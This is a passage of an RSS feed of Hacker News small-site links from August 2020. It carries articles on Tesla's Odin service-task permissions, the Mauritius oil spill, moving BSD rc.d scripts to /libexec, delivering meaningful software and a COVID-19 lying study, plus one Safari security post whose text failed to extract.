<li>tbx-internal</li>
<li>tbx-external</li>
<li>tbx-technical-specialist</li>
<li>tbx-engineering</li>
<li>tbx-service</li>
</ul>
<p>These seem to be mostly internal car tests likely used during manufacturing.
The only time the non internal/external principals show up is for
<code>PROC_ICE_X_LOGS-UPLOADER</code> and <code>ICE_DEASSOCIATE_PRODUCT_ID</code>. The second is
engineering only and appears to wipe the vehicle VIN and car config.</p>
<p>The <code>remote_execution_permission</code> levels listed in the Odin tasks are:</p>
<ul>
<li>tbx-service</li>
<li>tbx-service-infotainment</li>
<li>tbx-technical-specialist</li>
<li>tbx-service-engineering</li>
<li>tbx-engineering</li>
<li>tbx-mothership</li>
</ul>
<p>Things like <code>TEST-BASH_ICE_X_SEARCH-UI-ALERTS</code> can be accessed by <code>tbx-service</code>,
<code>tbx-service-engineering</code> and <code>tbx-mothership</code>.</p>
<p>Things like <code>PROC_ICE_X_SET-VEHICLE-CONFIG</code> can only be accessed by
<code>tbx-mothership</code>.</p>
<p>The token’s are signed by an intermediate certificate. This intermediate
certificate public key is included as part of the token and signed by Tesla’s
root CA. From my understanding this follows standard security practices of web
CAs to prevent the root certificate from being compromised.</p>
<h3 id="odin-networks">Odin Networks</h3>
<p>Odin is implemented in a pretty interesting way. There’s a list of <code>tasks</code> and
<code>networks</code>. The tasks are high level actions that can be executed by someone
with specific permissions.</p>
<p>The <code>lib</code> files are “networks” that appear to be a domain specific language/UI
program just for creating service tasks.</p>
<p>The networks are very close to JSON but stored in <code>.py</code> files.</p>
<p>Here’s an excerpt of one:</p>
<div><pre><code data-lang="py"><span>network</span> <span>=</span> <span>{</span>
<span>...</span>
    <span>"get_success"</span><span>:</span> <span>{</span>
	<span>"default"</span><span>:</span> <span>{</span><span>"datatype"</span><span>:</span> <span>"Bool"</span><span>,</span> <span>"value"</span><span>:</span> <span>False</span><span>},</span>
	<span>"position"</span><span>:</span> <span>{</span><span>"y"</span><span>:</span> <span>265.22259521484375</span><span>,</span> <span>"x"</span><span>:</span> <span>108.96072387695312</span><span>},</span>
	<span>"variable"</span><span>:</span> <span>{</span><span>"value"</span><span>:</span> <span>"success"</span><span>},</span>
	<span>"value"</span><span>:</span> <span>{</span><span>"datatype"</span><span>:</span> <span>"Bool"</span><span>},</span>
	<span>"type"</span><span>:</span> <span>"networks.Get"</span><span>,</span>
    <span>},</span>
    <span>"IfThen"</span><span>:</span> <span>{</span>
	<span>"position"</span><span>:</span> <span>{</span><span>"y"</span><span>:</span> <span>340.1793670654297</span><span>,</span> <span>"x"</span><span>:</span> <span>297.02069091796875</span><span>},</span>
	<span>"expr"</span><span>:</span> <span>{</span><span>"datatype"</span><span>:</span> <span>"Bool"</span><span>,</span> <span>"connection"</span><span>:</span> <span>"get_success.value"</span><span>},</span>
	<span>"if_true"</span><span>:</span> <span>{</span><span>"connection"</span><span>:</span> <span>"exit.exit"</span><span>},</span>
	<span>"type"</span><span>:</span> <span>"control.IfThen"</span><span>,</span>
	<span>"if_false"</span><span>:</span> <span>{</span><span>"connection"</span><span>:</span> <span>"capturemetric.capture"</span><span>},</span>
    <span>},</span>
<span>...</span>
<span>}</span>
</code></pre></div><p>Each network is structured as a series of nodes with types describing what they
do. The nodes can consume inputs from other nodes via “connection"s. The actual
logic of each node type is implemented in standard python.</p>
<p>The <code>position</code> field seems to indicate that these networks are created via a UI
tool.</p>
<h3 id="toolbox">Toolbox</h3>
<p>Tesla’s service tool is called Toolbox. There seems to be two versions.</p>
<ol>
<li>A program you can download …</li></ol></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fn.lc/post/tesla-model-3/">https://fn.lc/post/tesla-model-3/</a></em></p>]]>
            </description>
            <link>https://fn.lc/post/tesla-model-3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24268185</guid>
            <pubDate>Tue, 25 Aug 2020 04:46:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Economic Cost of Oil Spills]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24268051">thread link</a>) | @amrrs
<br/>
August 24, 2020 | https://finshots.in/archive/the-economic-cost-of-oil-spills/ | <a href="https://web.archive.org/web/*/https://finshots.in/archive/the-economic-cost-of-oil-spills/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">

    <div>

        <article>

            

            <figure>
                <img srcset="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/oilsp-min.jpg 300w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/oilsp-min.jpg 600w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/oilsp-min.jpg 1000w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/oilsp-min.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/oilsp-min.jpg" alt="The Economic Cost of Oil Spills">
            </figure>

            <section>
                <div>
                    <p><em>A few days ago, a cargo vessel MV Wakashio ran aground off Pointe d’Esny, on the south-east coast of Mauritius and started spilling oil.</em></p><p><em>Needless to say, we need to talk about it.</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="the-story">The Story</h3><p>Imagine thousands of gallons of oil pouring into a water body somewhere along the coast of a small island nation. Your first order of business is to contain and clean up the spill — in that order specifically.</p><p>Because when oil does spill, it forms a thick film that floats on top of the water body slowly spreading out and thinning as time progresses. More time means more coverage area. More coverage means a more elaborate cleanup effort. So in theory, if a cleanup crew can reach a spill quickly, they could contain it more efficiently and reduce costs across the board.</p><p>With the MV Wakashio oil spill, things didn’t exactly go as planned. The ship <a href="https://gcaptain.com/wakashio-breached-oil-leaks-from-grounded-bulk-carrier-in-mauritius-police-investigation-launched/#:~:text=The%20Indian%20Ocean%20island%20nation,Brazil%20via%20Singapore%20on%20ballast.">struck</a> a reef on July 25th and its body began to crack after days of pounding waves. At the time, the Mauritius government could have averted the crisis altogether by emptying the ship of its fuel. But that did not happen. Instead, the ship kept taking the beating and finally started leaking fuel on August 6th. Now the ship’s owners contest that oil prevention measures were in place by then. But clearly, it wasn’t helping a lot.</p><!--kg-card-begin: image--><figure><img src="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/5f2bf41a78a54_wakashio_ecosud-1443924.jpg"><figcaption><a href="https://la1ere.francetvinfo.fr/reunion/naufrage-du-wakashio-il-y-breche-fuite-huile-859552.html">Source: France Info</a></figcaption></figure><!--kg-card-end: image--><p>The Mauritius government could have taken some initiative here. But they waited for a whole day before finally taking stock of the situation and <a href="https://www.bbc.com/news/world-africa-53702877#:~:text=The%20island%20nation%20of%20Mauritius,and%20its%20crew%20was%20evacuated.&amp;text=The%20French%20island%20of%20Reunion%20lies%20near%20Mauritius%20in%20the%20Indian%20Ocean.">declaring emergency</a> late on Aug 7th. Thankfully the people of Mauritius stepped up. As an article in the New York Times <a href="https://www.nytimes.com/2020/08/14/world/africa/mauritius-oil-spill.html">notes</a> —</p><blockquote><em>“Immediately after the accident, individuals, civil society organizations and environmental groups mobilized to save the mangrove forest and coral reefs that give Mauritian waters their rich biodiversity.<p>Thousands of volunteers pulled all-nighters gathering plastic bottles and skimming oil into barrels, while salons donated hair and <a href="https://www.instagram.com/p/CDt2gpzg133/?igshid=1uidpqls8erlm" rel="noopener noreferrer noopener">children collected straw</a> from fields to help soak up the oil. Mauritians abroad began <a href="https://www.instagram.com/savemauritiusreef/" rel="noopener noreferrer noopener">social media campaigns</a> to raise awareness, and hundreds of thousands of dollars <a href="https://www.crowdfund.mu/mauritius-oil-spill-cleaning-2020-mv-wakashio-306.html" rel="noopener noreferrer noopener">were collected</a> on fund-raising platforms.”</p></em></blockquote><p>However, despite the collective effort, the size of the oil slick had already <a href="https://twitter.com/UrsaSpace/status/1293587048344047621?s=20" rel="noopener">expanded 10x</a> within just one week and the cleanup effort could now take months costing the shipping company and the Mauritius government millions of dollars.</p><p>How many millions? That’s difficult to calculate.</p><p>The Exxon Valdez case— a spill of approximately 10.8 million gallons in Alaska in 1989 cost <a href="https://media.rff.org/archive/files/sharepoint/WorkImages/Download/RFF-BCK-Cohen-DHCosts_update.pdf">$2.1 Billion</a> (in cleanup efforts). The MV Wakashio, on the other hand, was only carrying ~127,000 gallons of oil. The reason for the disparity — Exxon Valdez was a cargo ship ferrying oil. Wakashio was an empty ship travelling to pick cargo. The leak was from the fuel tank and the oil it was carrying to propel the vessel. Also, the cleanup team emptied the ship of its fuel before everything could spill out. So it’s safe to say the cleanup effort won’t cost billions.</p><p>But the impact will probably be severe either way.</p><p>Beyond the cleanup costs, we also have to contend with the ecological devastation that almost inevitably follows. Four years after the Exxon Valdez spill, a population of forage fish called herring <a href="https://www.history.com/topics/1980s/exxon-valdez-oil-spill">disappeared</a> entirely from the location where the vessel broke. Scientists still aren’t sure why this happened. They can’t even ascertain fully if the oil spill was to blame. But the impact of this disappearance was catastrophic. It spelt the death of an 8-million-dollar-a-year fishery industry. Although most fishermen never explicitly sought herrings, these small forage fishes are preyed on by larger fish for food. Once the population of herrings collapsed, it left a gaping hole in the middle of the marine food chain. 25 years later, herrings are yet to return and the fishery industry has all but vanished.</p><p>With the Wakashio oil spill, we have the same concerns. Blue Bay — The place where the ship ran aground was <a href="https://www.bloombergquint.com/opinion/why-mauritius-oil-spill-is-a-very-big-problem-for-the-oil-industry">declared</a> a marine park back in 1997. It’s perhaps one of the last remaining areas which still harbours undamaged coral reefs and an abundance of underwater life. The oil spill might have spelt the death of the ecological balance in the area. What will it cost the local population? We don’t know yet. But it’s a tragedy that we still have to contend with oil spills this day and age.</p><p>Share this Finshots on <a href="https://api.whatsapp.com/send?text=What%20happens%20when%20there%27s%20an%20oil%20spill?%20https://bit.ly/3llY8AL">WhatsApp</a>, <a href="https://twitter.com/intent/tweet?url=https://bit.ly/3jdaCsa&amp;via=finshots&amp;text=What%20happens%20when%20there%27s%20an%20oil%20spill?">Twitter</a>, or <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://finshots.in/archive/the-economic-cost-of-oil-spills">LinkedIn</a>.</p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="an-inside-scoop">An Inside Scoop</h3><p>A few days back we wrote about the legal battle brewing between Apple and Epic Games. Since then, news websites have managed to access the email correspondence between the two companies before Epic Games decided to file the lawsuit. And considering it’s not always you get to read internal emails from top companies, we urge you to read the full correspondence <a href="https://www.theverge.com/2020/8/21/21396313/apple-fortnite-lawsuit-emails-app-store-ban-epic">here</a>. It’s quite revealing to be honest.</p><p>P.S. The actual correspondence is located in the exhibit at the bottom of the article.</p><p><em>Until next time...</em></p>
                </div>
            </section>


            

            
            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://finshots.in/archive/the-economic-cost-of-oil-spills/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24268051</guid>
            <pubDate>Tue, 25 Aug 2020 04:02:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[rc.d belongs in libexec, not etc]]>
            </title>
            <description>
<![CDATA[
Score 70 | Comments 65 (<a href="https://news.ycombinator.com/item?id=24267933">thread link</a>) | @Khaine
<br/>
August 24, 2020 | https://jmmv.dev/2020/08/rcd-libexec-etc.html | <a href="https://web.archive.org/web/*/https://jmmv.dev/2020/08/rcd-libexec-etc.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              
              <article>

<p>Let’s open with the controversy: the scripts that live under <code>/etc/rc.d/</code> in FreeBSD, NetBSD, and OpenBSD are in the wrong place. They all should live in <code>/libexec/rc.d/</code> because they are code, <em>not</em> configuration.</p>

<p>This misplacement is something that has bugged me for ages but I never had the energy to open this can of worms back when I was very involved in NetBSD. I suspect it would have been a draining discussion and a very difficult thing to change.</p>

<p>But… what am I talking about anyway?</p>

<p>If you have administered a BSD system, you have certainly encountered the <code>/etc/rc.d/</code> directory; and if you have administered pre-systemd Linux systems, you have dealt with <code>/etc/init.d/</code>. These directories contain startup scripts to configure the system at boot time and are immutable. Their code is parameterized to allow changing their behavior via configuration files, not via code edits. And that’s the base of my critique.</p>

<p>But before getting into why the current state is problematic and how things should look like, let’s first dig into how we got here. And, for that, we need to go back in history.</p>



<p>4.4BSD’s (1993) boot process was rather simple: the kernel started <code>init</code> which in turn ran the <code>/etc/rc</code> script before starting <code>getty</code> on each console. The <code>/etc/rc</code> monolith was in charge of configuring the machine’s file systems and processes, and delegated to two other scripts: <code>/etc/netstart</code> for network configuration and <code>/etc/rc.local</code> for locally-added services. Current BSD systems are more advanced in this area as we shall see later, but the core boot process remains the same: <code>/etc/rc</code> is the primary entry point and bootstraps a collection of shell scripts.</p>

<p>In the early days, package management and file provenance tracking, like we are used to having in popular Linux distributions, was not a thing. You were expected to tune the systems’ behavior by <em>editing</em> files which might or might not have been designed to support edits. If you had to edit <code>/etc/rc</code>, which was a script shipped by the system, that was alright.</p>

<p><code>/etc/rc.local</code>, on the other hard, was <em>not</em> shipped by the system, and it was up to you to create it if you wanted to add custom startup commands without modifying <code>/etc/rc</code>. And this is where things get interesting. <code>/etc/rc.local</code> didn’t need to be supported: if you were expected and able to edit <code>/etc/rc</code> anyway, why would you deal with a separate file? The reason is, most likely, to simplify system upgrades: during an upgrade, you want to benefit from any upstream changes made to <code>/etc/rc</code> (some of which might actually be <em>necessary</em> for proper system operation). Applying updates to a manually-modified file is tricky, so putting as many of your manual overrides into <code>/etc/rc.local</code> helped minimize this problem.</p>



<p>System V 4 (SVR4, 1988) also came with its own, and very different, boot process. The key difference was that System V had the concept of runlevels. As a result, configuring the boot process was a more convoluted endeavour because it was possible to select different services per runlevel.</p>

<p>To accomplish per-runlevel tuning, the system used <a href="https://jmmv.dev/2020/08/config-files-vs-directories.html">configuration directories rather than files</a>: there was a separate <code>/etc/rcX.d/</code> directory for each runlevel (where <code>X</code> was the number of the runlevel), and these directories contained one file per action to take at startup time. To avoid duplicates, these files were just symlinks to common files under <code>/etc/init.d/</code>—and the symlinks, not their targets, were named so that their lexicographical order determined startup execution order.</p>

<p>Once again, we can already observe issues here: the symlinks under <code>/etc/rcX.d/</code> <em>are</em> configuration because their presence indicates what to start and their names determine their startup order. But the files under <code>/etc/init.d/</code> are <em>not</em>: they are shell scripts shipped with the system and should not be manually modified.</p>



<p>NetBSD <a href="http://www.mewburn.net/luke/papers/rc.d.pdf">modernized the boot process</a> in its 1.5 release (2000), and it did so in two ways: first, it introduced <code>/etc/rc.d/</code> as a directory to contain separate scripts per action and service; and, second, it introduced <a href="https://netbsd.gw.com/cgi-bin/man-cgi?rcorder+8+NetBSD-9.0-STABLE">the <code>rcorder(8)</code> tool</a> to determine the order in which these services run. <code>rcorder(8)</code> uses dependency information encoded in the scripts as comments—not lexicographical ordering as System V did. FreeBSD <a href="https://www.freebsd.org/cgi/man.cgi?query=rc&amp;apropos=0&amp;sektion=8&amp;manpath=FreeBSD+12.1-RELEASE&amp;arch=default&amp;format=html">inherited this design</a> in its 5.0 release (2003) and OpenBSD reimplemented something similar in its 4.9 release (2011).</p>

<p>With these two pieces in place, the <code>/etc/rc</code> script in NetBSD and FreeBSD changed to execute all files from <code>/etc/rc.d/</code> based on the output of <code>rcorder(8)</code>. Among these scripts is <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc.d/local"><code>/etc/rc.d/local</code></a>, whose purpose is to run <code>/etc/rc.local</code> if it exists. And that’s all, really. The <code>/etc/rc</code> script thus became <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc">trivial</a>.</p>

<p>The key thing to notice here is that the scripts shipped in <code>/etc/rc.d/</code> are <em>highly configurable</em> via the user-controlled <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc.conf"><code>/etc/rc.conf</code></a> file. This essentially makes the scripts read-only, as it shifts local customizations to the configuration file. <em>System administrators are not supposed to edit the scripts.</em> Instead, they are supposed to: modify <code>/etc/rc.conf</code> to customize what gets run and how; add new scripts under <code>/etc/rc.d/</code> if they so choose; and edit <code>/etc/rc.local</code> to easily run arbitrary commands.</p>



<p>My main gripe is that the files under <code>/etc/rc.d/</code> are immutable scripts. They do not belong in <code>/etc/</code> and their presence there makes system upgrades harder for no good reason.</p>

<p>You see: in NetBSD and FreeBSD, system upgrades happen by unpacking new distribution sets in the root directory and then running a script to incorporate configuration updates. This script is interactive and helps highlight how new system-provided updates to configuration files conflict with previous manual edits. (This process might seem rudimentary to you, but it’s actually pretty robust and easy to understand—and you can use tooling like <a href="https://github.com/jmmv/sysupgrade/">sysupgrade</a> to make it trivial.)</p>

<p>So why is that a problem? Because you will <em>always</em> face merges like this:</p>
<div><pre><code data-lang="diff"><span>--- /etc/rc.d/npf               2019-08-09 19:09:42.800758233 -0400
</span><span></span><span>+++ /tmp/temproot/etc/rc.d/npf  2019-11-16 10:39:27.000000000 -0500
</span><span></span><span>@@ -1,6 +1,6 @@
</span><span></span> #!/bin/sh
 #
<span>-# $NetBSD: npf,v 1.3 2012/11/01 06:06:14 mrg Exp $
</span><span></span><span>+# $NetBSD: npf,v 1.4 2019/04/19 18:36:25 leot Exp $
</span><span></span> #
 # Public Domain.
 #
<span>@@ -36,7 +36,11 @@
</span><span></span>        echo "Enabling NPF."
        npf_cfg_check
        /sbin/npfctl reload
<span>-       /sbin/npfctl start
</span><span></span><span>+
</span><span>+       # The npf_boot script has enabled npf already.
</span><span>+       if [ "$autoboot" != "yes" ]; then
</span><span>+               /sbin/npfctl start
</span><span>+       fi
</span><span></span> }
 
 npf_stop()

File: /etc/rc.d/npf (modified)

Please select one of the following operations:

  d  Don't install the new file (keep your old file)
  i  Install the new file (overwrites your local modifications!)
  m  Merge the currently installed and new files
  s  Show the differences between the currently installed and new files
  su  Show differences in unified format ("diff -u")
  sc  Show differences in context format ("diff -c")
  ss  Show differences side by side ("sdiff -w187")
  scommand Show differences using the specified diff-like command
  v  Show the new file

What do you want to do? [Leave it for later]
</code></pre></div>
<p>And, really, who cares? Why are you being distracted to review a <em>code</em> change when what you are trying to do is assess <em>configuration</em> conflicts? How many times have you actually objected to these merges?</p>

<p>You might say: well, I want to know <em>exactly</em> how the boot process of my machine changes during an upgrade. Sure, that’s a fine goal, but then this procedure is flawed and completely insufficient to achieve such goal. In the example above, whatever <code>/etc/rc.d/npf</code> does can also be done from within the <code>/sbin/npfctl</code> binary it invokes… and you were never asked to review changes to the latter during an upgrade, were you? And <em>of course</em> you could review the binary’s code as part of your own system build, but if you did that, then you could have reviewed the startup script as well, right?</p>



<p>Startup scripts provided by the system need to live in a location that can contain executables—but we don’t want those executables to show up in the <code>PATH</code>. These requirements discard <code>bin</code> and <code>sbin</code>, and points us towards <code>libexec</code> on BSD systems and somewhere under <code>lib</code> on Linux.</p>

<p>Therefore, the read-only startup scripts should move from <code>/etc/rc.d/</code> to <code>/libexec/rc.d/</code> (which, by the way, also applies to <code>/etc/rc</code>, <code>/etc/rc.subr</code>, and <code>/etc/rc.shutdown</code>). And that’s it. <del><code>/etc/rc</code></del> <code>/libexec/rc</code> should continue to use <code>rcorder(8)</code> to check what’s needed to run, but it should read files from <code>/libexec/rc.d/</code>. You might even want to support a separate location for user-created services, which might still be <code>/etc/rc.d/</code> or, better yet, a more fitting location like <code>/usr/pkg/libexec/rc.d/</code> (though that quickly runs into problems if you have multiple file systems).</p>

<p>With this design, system upgrades would be much saner because the configuration merge process would focus, purely, on actual configuration changes and not on irrelevant code changes. All updates to <code>/libexec/rc.d/</code> would be applied by unpacking the new distribution sets (<code>base.txz</code> in this case) without disturbing you about how exactly they changed.</p>

<p>Does this relate to Linux distributions at all? I briefly mentioned <code>/etc/init.d/</code> at the beginning, and the problem there is similar. But it’s also an obsolete problem given that Linux distributions have moved onto systemd by now. That said, systemd still has to manage individual services and, like it or not, has gotten this right. If we look at the <a href="https://www.freedesktop.org/software/systemd/man/systemd.unit.html"><code>systemd.unit(5)</code></a> manual page, which describes where units are loaded from, the system first looks into various <code>/etc/</code> and <code>/run/</code> directories, but then also looks at <code>/usr/lib/systemd/system/</code> (a read-only location correctly controlled by the package manager)—and the vast majority of the scripts live inside the latter.</p>



<p>I currently don’t run BSD systems any more so my incentives to make this happen are low… but if this all makes sense and is something you’d like to pursue, by all means please do! I’m happy to help …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jmmv.dev/2020/08/rcd-libexec-etc.html">https://jmmv.dev/2020/08/rcd-libexec-etc.html</a></em></p>]]>
            </description>
            <link>https://jmmv.dev/2020/08/rcd-libexec-etc.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267933</guid>
            <pubDate>Tue, 25 Aug 2020 03:35:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing Local Files Using Safari Web Share API – Redteam.pl Techblog]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24267676">thread link</a>) | @jayliew
<br/>
August 24, 2020 | https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html | <a href="https://web.archive.org/web/*/https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267676</guid>
            <pubDate>Tue, 25 Aug 2020 02:37:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Deliver Meaningful Software]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24267325">thread link</a>) | @astrocreep2k
<br/>
August 24, 2020 | https://7samurai.dev/2020/08/24/how-to-deliver-meaningful-software/ | <a href="https://web.archive.org/web/*/https://7samurai.dev/2020/08/24/how-to-deliver-meaningful-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
										
	<div>
	
		<div>
												        
									
				<div id="post-20">

										
					<div>
					
						<!-- .post-header -->
						
											
						<p><img width="1140" height="863" src="https://7samurai.dev/wp-content/uploads/2020/08/image-11-1140x863.jpg" alt="Meaningful Features" loading="lazy" srcset="https://7samurai.dev/wp-content/uploads/2020/08/image-11-1140x863.jpg 1140w, https://7samurai.dev/wp-content/uploads/2020/08/image-11-300x227.jpg 300w, https://7samurai.dev/wp-content/uploads/2020/08/image-11-1024x775.jpg 1024w, https://7samurai.dev/wp-content/uploads/2020/08/image-11-768x582.jpg 768w, https://7samurai.dev/wp-content/uploads/2020/08/image-11-1536x1163.jpg 1536w, https://7samurai.dev/wp-content/uploads/2020/08/image-11-2048x1551.jpg 2048w, https://7samurai.dev/wp-content/uploads/2020/08/image-11-552x418.jpg 552w" sizes="(max-width: 1140px) 100vw, 1140px">									
						</p><!-- .featured-media -->
					
																			                                    	    
						<div>

							
<p><strong>Surprise! Delivering valuable software is difficult.</strong> (Ok.. maybe not that surprising.)</p>



<div><p>Maybe it started out well – but over time it grew stale. Or it was wrong from the very beginning. Despite the common belief that software is an asset – it’s just as easily a liability.&nbsp;</p><p>Let’s start with how do you define “Meaningful” software? Developers know when something they are working on doesn’t matter. Sometimes the indicator is a lack of interest in investing further or it’s heavy investment in something that gets little usage. Either way meaningful software must be a win-win for both creator and consumer.</p></div>



<p><strong>“Meaningful software delivers value to a substantial segment of the target user group and </strong><strong>directly</strong><strong> supports the goals and objectives of those delivering the software. “</strong></p>



<p>I’ll argue that any software feature or platform that fulfills this criteria will produce positive results. I’ll also suggest that it can be challenging to achieve and maintain this balance.</p>



<blockquote><p>Example 1: <em>“Hey – we should build our own shopping cart system”</em></p></blockquote>



<p>If you are competing against Amazon in the high volume retail market and need proprietary AI recommendation systems – then it’s a worthy investment. If you are selling flowers at the corner market, probably not. It sounds simple on the surface but the question you always need to ask is: will it give me a competitive advantage and help me directly achieve my goals?</p>



<blockquote><p>Example 2: <em>“Hey, power user X says they would love this feature”</em></p></blockquote>



<p>Power users and early adopters are extremely valuable. But it’s important that you obtain and test feedback against a larger market. Investing in a feature that is utilized by a few users doesn’t contribute to growth. Will it deliver value to a large portion of my target users?</p>



<h2>Why is this important?</h2>



<p><strong>Software that isn’t meaningful isn’t sustainable</strong>.<br>If it doesn’t meet the objectives of its creators, they should be building something else.&nbsp; If it doesn’t deliver value to a substantial number of target users then they don’t really need it or should be using something else.&nbsp; When one or both of these conditions have not been met it creates an imbalance that generally results in a slow painful death for the platform.</p>



<p><strong>Software that isn’t meaningful creates unnecessary costs for its creator.</strong> This takes many forms – time, opportunity, and financial cost. The long term impact of holding meaningless software with active users is dangerous because its toxic byproducts are usually hidden in the depths of technical teams.&nbsp; If your are interested in learning more about the costs associated with building features, <a href="https://productcoalition.com/the-real-cost-of-adding-a-new-feature-9d527448df41">this is a great article</a> that highlights the risks.<br>&nbsp;</p>



<p><strong>Software that isn’t meaningful disrupts focus on key objectives.</strong> It creates confusion, takes over meetings, hurts morale, and ultimately can derail strategic direction. The real danger of meaningless software is it appears to be “low hanging fruit” and usually brings a level of comfort that attracts all sorts of “feature requests” and “ideas”.&nbsp; If the creators lose sight of its intended purpose then the strategic objective quickly shifts from whatever it was originally to the ambiguous effort of making the software “better”. <br>&nbsp;</p>







<div><p><strong>Mastering the ability to distinguish meaningful from meaningless requires discipline.</strong> You have to be honest with yourself and objective about what it is you are producing.&nbsp; You cannot fall in love with your creation. You have to be willing to refactor design, listen to concerns, take time to organize, reject tradition, kill exciting (but distracting) ideas, and ignore the urge to “make things” right without purpose.&nbsp; It requires focus and it requires constant re-evaluation. It’s uncomfortable – but once you know you are building something that matters – it all clicks.</p><p><strong>Shaping software into something meaningful requires thinking holistically.</strong>&nbsp;  Understanding the goals of stakeholders, needs of target users, cost of building, validation techniques, and methods of promotion are just as important as the mechanics of how the software functions. Alignment and positioning of effort is key to the  “meaningful” attribute of the art.</p></div>



<p><strong>Producing meaningful software requires a fundamental understanding of how software is created, tested, and distributed.</strong> It’s also not enough to make plans and collaborate with stakeholders – it’s very important to understand capabilities, risks, and mechanics of how software is made and maintained. You don’t have to be a developer to deliver meaningful software, but you do need to know how to communicate with one. Mastering this is how the “delivery” happens.</p>







<div><p><strong>The end product speaks for itself.</strong> If you can’t deliver it or what is shipped doesn’t provide direct value then start over or re-work. Much like an artist would paint over the canvas or toss it away – there is no value (only risk) in maintaining meaningless software.&nbsp; Attachment to sunk cost, “technology” hording, and pet projects are guaranteed ways to fail or prolong the achievement of goals.</p><p><strong>If you want to improve your ability to contribute to and drive the delivery of meaningful software</strong> I’d encourage you to follow along on this journey – <a href="https://7samurai.dev/weekly-newsletter/">sign up for my weekly newsletter</a>.</p></div>
<!-- Simple Share Buttons Adder (7.7.1) simplesharebuttons.com -->							
							
										        
						</div><!-- .post-content -->
						
												
					</div><!-- .post-inner -->
					            					
					<!-- .post-meta.bottom -->
					
					<!-- .post-nav -->
												                        
			   	    
				
				
	<!-- .widget-area -->

						
			</div><!-- .post -->
		
		</div><!-- .content -->
		
		
		
	</div><!-- .wrapper-inner -->

</div></div>]]>
            </description>
            <link>https://7samurai.dev/2020/08/24/how-to-deliver-meaningful-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267325</guid>
            <pubDate>Tue, 25 Aug 2020 01:22:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One-third of people with Covid-19 lie about their symptoms, study shows]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24267303">thread link</a>) | @9nGQluzmnq3M
<br/>
August 24, 2020 | https://www.cbc.ca/news/canada/hamilton/covid-19-1.5695230 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/hamilton/covid-19-1.5695230">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>New research from Brock University shows those trying to prevent the spread of COVID-19 are up against an intriguing obstacle: people lying.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5691965.1597849582!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/covid-19-travel-restrictions.JPG"></p></div><figcaption>A new article from Brock University psychology researchers shows one-third of people with COVID-19 are likely to lie about their symptoms, or how much they've been following health protocols.<!-- --> <!-- -->(Ben Nelms/CBC)</figcaption></figure><p><span><p>New research from Brock University shows those trying to prevent the spread of COVID-19 are up against an intriguing obstacle: people lying.</p>  <p>A study from doctoral student Alison O'Connor and Angela Evans, associate professor in the psychology department, shows that at least one-third of the population with COVID-19&nbsp;lied about having symptoms, and also about the amount that they stayed&nbsp;physically distant from others.</p>  <p>The team surveyed 451 Americans aged 20 to 82. Thirty-four per cent of people with the virus had&nbsp;denied having symptoms when others asked, and 55 per cent&nbsp;said they'd concealed their symptoms on some level.</p>  <p>And a quarter of all respondents&nbsp;said they lied about how much they were following health protocols. Those with COVID-19 were even more likely to lie about it.</p>  <p>O'Connor says this should act as a warning that the numbers we see are only part of the story.&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5695362.1598030728!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/alison-o-connor.jpg 300w,https://i.cbc.ca/1.5695362.1598030728!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/alison-o-connor.jpg 460w,https://i.cbc.ca/1.5695362.1598030728!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/alison-o-connor.jpg 